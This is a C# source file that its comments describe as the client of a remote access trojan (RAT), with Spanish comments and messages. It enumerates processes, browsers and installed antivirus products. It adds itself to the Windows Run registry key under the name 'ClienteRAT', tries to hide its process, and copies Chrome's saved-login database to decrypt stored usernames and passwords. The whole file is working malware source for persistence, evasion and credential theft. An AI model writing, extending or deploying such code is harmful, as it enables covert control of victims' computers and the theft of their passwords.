using Client.Native;
using Microsoft.Win32;
using System.Diagnostics;
using System.Management;
using System.Text;
using System.Data.SQLite;
using static Client.Native.NativeMethods;
using System.Runtime.InteropServices;


namespace Client.Util
{
    internal struct ChromePassword
    {
        public string URL { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }

    }
    static class Functions
    {
        public static string ListProcesses()
        {
            StringBuilder processList = new StringBuilder();
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                processList.AppendLine($"{process.ProcessName} (ID: {process.Id})");
            }
            return processList.ToString();
        }

        public static string ListInstalledBrowsers()
        {
            StringBuilder browsersList = new StringBuilder();

            // Lista de rutas típicas de instalación de navegadores
            string[] browserPaths = {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Google", "Chrome", "Application", "chrome.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Google", "Chrome", "Application", "chrome.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "Application", "chrome.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Mozilla Firefox", "firefox.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Mozilla Firefox", "firefox.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mozilla Firefox", "firefox.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Opera", "launcher.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Opera", "launcher.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Opera", "launcher.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Internet Explorer", "iexplore.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Internet Explorer", "iexplore.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "Application", "msedge.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft", "Edge", "Application", "msedge.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "SxS", "Application", "msedge.exe")
            };
            browsersList.AppendLine("\n");
            browsersList.AppendLine("====================================================================");
            browsersList.AppendLine("|                       Navegadores Instalados                     |");
            browsersList.AppendLine("====================================================================");

            foreach (var browserPath in browserPaths)
            {
                if (File.Exists(browserPath))
                {
                    browsersList.AppendLine($"{browserPath,-55} ");
                }
            }

            browsersList.AppendLine("====================================================================");

            return browsersList.ToString();
        }



        public static string KillProcess(int pid)
        {
            try
            {
                Process process = Process.GetProcessById(pid);
                if (process != null)
                {
                    process.Kill();
                    return $"Proceso con PID {pid} terminado correctamente.";
                }
                else
                {
                    return $"No se encontró ningún proceso con PID {pid}.";
                }
            }
            catch (ArgumentException)
            {
                return $"No se encontró ningún proceso con PID {pid}.";
            }
            catch (Exception ex)
            {
                return $"Error al intentar terminar el proceso: {ex.Message}";
            }
        }


        public static string getWindowsActiveTitle()
        {

            StringBuilder windowTitle = new StringBuilder(256);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, windowTitle, windowTitle.Capacity) > 0) { return windowTitle.ToString(); }
            else { return "No se ha podido obtener el nombre de la ventana activa"; }



        }
       
        public static void AddPersistence()
        {
            try
            {
                // Ruta al ejecutable del cliente RAT
                string executablePath = Process.GetCurrentProcess().MainModule.FileName;

                // Clave de registro donde se añadirá la entrada de inicio
                string keyName = @"Software\Microsoft\Windows\CurrentVersion\Run";

                // Abrir la clave de registro
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true))
                {
                    if (key == null)
                    {
                        // La clave no existe, crearla
                        using (RegistryKey newKey = Registry.CurrentUser.CreateSubKey(keyName))
                        {
                            newKey.SetValue("ClienteRAT", executablePath);
                            Debug.WriteLine("Entrada de registro creada con éxito.");
                        }
                    }
                    else
                    {
                        // La clave ya existe, actualizar el valor si es necesario
                        object existingValue = key.GetValue("ClienteRAT");
                        if (existingValue == null || existingValue.ToString() != executablePath)
                        {
                            key.SetValue("ClienteRAT", executablePath);
                            Debug.WriteLine("Entrada de registro actualizada con éxito.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error al modificar el registro: {ex.Message}");
            }
        }

        public static void HideFromTaskManager()
        {
            try
            {
                // Obtener el handle del proceso actual
                IntPtr hProcess = Process.GetCurrentProcess().Handle;

                // Ocultar el proceso del Administrador de Tareas
                bool success = NativeMethods.SetProcessHideFromDebugger(hProcess);
               
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        public static string ListInstalledAntivirus()
        {
            StringBuilder antivirusList = new StringBuilder();

            try
            {
                // Especifica el ámbito de búsqueda
                ManagementScope scope = new ManagementScope(@"\\.\root\SecurityCenter2");
                scope.Connect();  // Conectar al ámbito

                // Define la consulta
                ObjectQuery query = new ObjectQuery("SELECT * FROM AntivirusProduct");

                // Ejecuta la consulta
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                using (ManagementObjectCollection collection = searcher.Get())
                {
                    antivirusList.AppendLine("Antivirus instalados:");

                    foreach (ManagementBaseObject antivirus in collection)
                    {
                        string antivirusName = antivirus["displayName"]?.ToString() ?? "Nombre desconocido";
                        antivirusList.AppendLine(antivirusName);
                    }
                }
            }
            catch (UnauthorizedAccessException uae)
            {
                antivirusList.AppendLine($"Error de acceso no autorizado al obtener los antivirus instalados: {uae.Message}");
            }
            catch (ManagementException me)
            {
                antivirusList.AppendLine($"Error de gestión al obtener los antivirus instalados: {me.Message}");
            }
            catch (Exception ex)
            {
                antivirusList.AppendLine($"Error general al obtener los antivirus instalados: {ex.Message}");
            }

            return antivirusList.ToString();
        }

        public static List<ChromePassword> getChromePasswords()
        {
            List<ChromePassword> passwords = new List<ChromePassword>();
            string LOGIN_DATA_PATH = "Google\\Chrome\\User Data\\Default\\Login Data";
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string loginDataPath = Path.Combine(localAppData, LOGIN_DATA_PATH);

            if (!File.Exists(loginDataPath))
            {
                Debug.WriteLine("El archivo de datos de inicio de sesión no se encuentra en la ruta especificada.");
                return passwords;
            }

            string tempLoginDataPath = Path.Combine(Path.GetTempPath(), "Login Data");

            try
            {
                File.Copy(loginDataPath, tempLoginDataPath, true);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error al copiar el archivo de base de datos: {ex.Message}");
                return passwords;
            }

            string connectionString = $"Data Source={tempLoginDataPath};Version=3;";
            try
            {
                using (var conn = new SQLiteConnection(connectionString))
                {
                    conn.Open();

                    using (SQLiteCommand cmd = new SQLiteCommand(conn))
                    {
                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                        using (SQLiteDataReader reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = reader["action_url"]?.ToString();
                                string username = reader["username_value"]?.ToString();
                                byte[] passwordBlob = reader["password_value"] as byte[];

                                if (url == null || username == null || passwordBlob == null)
                                {
                                    Debug.WriteLine("Se encontró un valor nulo en la base de datos.");
                                    continue;
                                }

                                string decryptedPassword = DecryptPassword(passwordBlob);

                                passwords.Add(new ChromePassword
                                {
                                    URL = url,
                                    Username = username,
                                    Password = decryptedPassword
                                });
                            }
                        }
                    }
                    conn.Close();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error al acceder a la base de datos: {ex.Message}");
            }
            finally
            {
                if (File.Exists(tempLoginDataPath))
                {
                    File.Delete(tempLoginDataPath);
                }
            }

            return passwords;

        }

        private static string DecryptPassword(byte[] encryptedData)
        {
            DATA_BLOB dataIn = new DATA_BLOB
            {
                pbData = Marshal.AllocHGlobal(encryptedData.Length),
                cbData = encryptedData.Length
            };
            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);

            DATA_BLOB dataOut = new DATA_BLOB();
            CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT
            {
                cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };

            
            CryptUnprotectData(ref dataIn, null, ref dataIn, IntPtr.Zero, ref prompt, 0, ref dataOut);
            byte[] decryptedData = new byte[dataOut.cbData];
            Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);

            Marshal.FreeHGlobal(dataIn.pbData);
            Marshal.FreeHGlobal(dataOut.pbData);

            return Encoding.UTF8.GetString(decryptedData);
        }


    }
}
